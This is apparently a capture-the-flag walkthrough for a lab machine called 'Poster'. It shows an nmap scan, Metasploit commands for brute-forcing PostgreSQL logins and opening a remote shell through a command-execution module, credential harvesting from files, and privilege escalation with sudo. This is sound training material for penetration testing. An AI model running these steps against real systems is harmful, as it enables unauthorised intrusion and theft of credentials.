# Poster

### Poster
Nmap scan shows ports 22,80 and 5432 open. 5432 is a remove postgreSQL database.
    
    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
    |   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
    |_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
    80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Poster CMS
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
    | ssl-cert: Subject: commonName=ubuntu
    | Not valid before: 2020-07-29T00:54:25
    |_Not valid after:  2030-07-27T00:54:25
    |_ssl-date: TLS randomness does not represent time

Following the hints provided in the task, lets use metasploit to enumerate login credentials. Open msfconsole and run the following commands (adapt the RHOST IP addres to your instance):

    use auxiliary/scanner/postgres/postgres_login
    run
![image](https://github.com/user-attachments/assets/0ba4853a-8555-4978-98ac-22e41afa0df0)<br />
Next, let's use another module to exploit this service and get a remote shell: 

    use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
    set lhost 10.11.85.53
    set rhost 10.10.207.24
    set password password
    run

Now, inside `dark`'s home directory there are his credentials: <br />
![image](https://github.com/user-attachments/assets/7686fdd2-d849-41e0-a709-2cf008436fe3)<br />
Inside `/var/www/html` I found a set of credentials: <br />
![image](https://github.com/user-attachments/assets/564c3e4f-456b-4f3a-a816-99f2cd2e7e38)<br />
I use it to log into `alison`'s account and get user.txt. Now to become root, there's no need to do anything. `alison` can run any command as root. 
![image](https://github.com/user-attachments/assets/7110ace4-e1d6-40ff-902b-03a52f149a1a)<br >
So just run `sudo su` and become root!

